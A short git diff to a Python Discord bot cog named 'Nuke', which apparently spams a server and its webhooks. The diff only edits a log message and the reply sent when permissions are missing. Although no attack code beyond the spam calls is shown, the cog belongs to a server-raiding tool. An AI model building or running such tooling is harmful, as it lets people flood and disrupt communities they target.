@@ -35,8 +35,7 @@ class Nuke(commands.Cog):
             await self.operations.spam(guild)
             logging.info(f"[nuke] spam_webhook -> {guild.id}")
             await self.operations.spam_webhook(guild)
-
-            logging.info(f"[nuke] done")
+            logging.info(f"[nuke] nuked {ctx.guild.name} successfully!")
         except Exception as e:
             tb = traceback.format_exc()
             logging.error(f"[nuke] failed: {e}\n{tb}")
@@ -44,7 +43,7 @@ class Nuke(commands.Cog):
     @nuke.error
     async def nuke_error(self, ctx: commands.Context, error):
         if isinstance(error, commands.MissingPermissions):
-            await ctx.reply("no perms to use this.", delete_after=5)
+            await ctx.reply("Fluk", delete_after=5)
         else:
             logging.error(f"[nuke] command error: {error}")
 
